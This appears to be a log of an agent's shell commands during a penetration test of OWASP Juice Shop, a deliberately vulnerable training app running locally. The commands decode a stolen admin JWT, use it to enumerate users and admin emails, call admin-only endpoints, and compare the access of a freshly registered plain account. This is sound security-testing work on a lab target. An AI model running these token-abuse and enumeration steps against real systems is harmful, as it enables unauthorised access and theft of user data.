args.command:
cd /workspace && TOKEN=$(cat evidence/c7_no_sqli_token.txt) && echo "len=${#TOKEN}" && echo "$TOKEN" | cut -d. -f1 | base64 -d 2>/dev/null; echo; echo "$TOKEN" | cut -d. -f2 | base64 -d 2>/dev/null | python3 -c 'import sys,json;d=json.load(sys.stdin);print("role=",d["data"]["role"],"id=",d["data"]["id"],"email=",d["data"]["email"])'; echo '--- admin endpoint /api/Users ---'; curl -s -o /tmp/u.json -w "HTTP %{http_code}
" -H "Authorization: Bearer $TOKEN" http://host.docker.internal:3000/api/Users; python3 -c 'import json;d=json.load(open("/tmp/u.json"))["data"];print("users:",len(d),"admins:",[u["email"] for u in d if u["role"]=="admin"])'; echo '--- authentication-details (admin-only) ---'; curl -s -o /dev/null -w "HTTP %{http_code}
" -H "Authorization: Bearer $TOKEN" http://host.docker.internal:3000/rest/user/authentication-details; echo '--- negative control: unsigned-ish token ---'; curl -s -o /dev/null -w "HTTP %{http_code}
" -H "Authorization: Bearer ${TOKEN%?}X" http://host.docker.internal:3000/api/Users

cd /workspace && E="c7plain2$(date +%s)@juice.sh"; curl -s -X POST http://host.docker.internal:3000/api/Users -H 'Content-Type: application/json' -d "{"email":"$E","password":"P4ssw0rd-C7-noSQLi!","passwordRepeat":"P4ssw0rd-C7-noSQLi!"}" >/dev/null; T=$(curl -s -X POST http://host.docker.internal:3000/rest/user/login -H 'Content-Type: application/json' -d "{"email":"$E","password":"P4ssw0rd-C7-noSQLi!"}" | python3 -c 'import sys,json;print(json.load(sys.stdin)["authentication"]["token"])'); echo "plain token /api/Users body:"; curl -s -H "Authorization: Bearer $T" http://host.docker.internal:3000/api/Users | head -c 400; echo; curl -s -o /dev/null -w "plain -> /rest/user/authentication-details HTTP %{http_code}
" -H "Authorization: Bearer $T" http://host.docker.internal:3000/rest/user/authentication-details; ADMIN=$(cat evidence/c7_no_sqli_token.txt); curl -s -o /dev/null -w "admin -> /rest/user/authentication-details HTTP %{http_code}
" -H "Authorization: Bearer $ADMIN" http://host.docker.internal:3000/rest/user/authentication-details; curl -s -o /tmp/fb.json -w "admin -> /api/Feedbacks?admin=true HTTP %{http_code}
" -H "Authorization: Bearer $ADMIN" "http://host.docker.internal:3000/api/Feedbacks?admin=true"; head -c 200 /tmp/fb.json
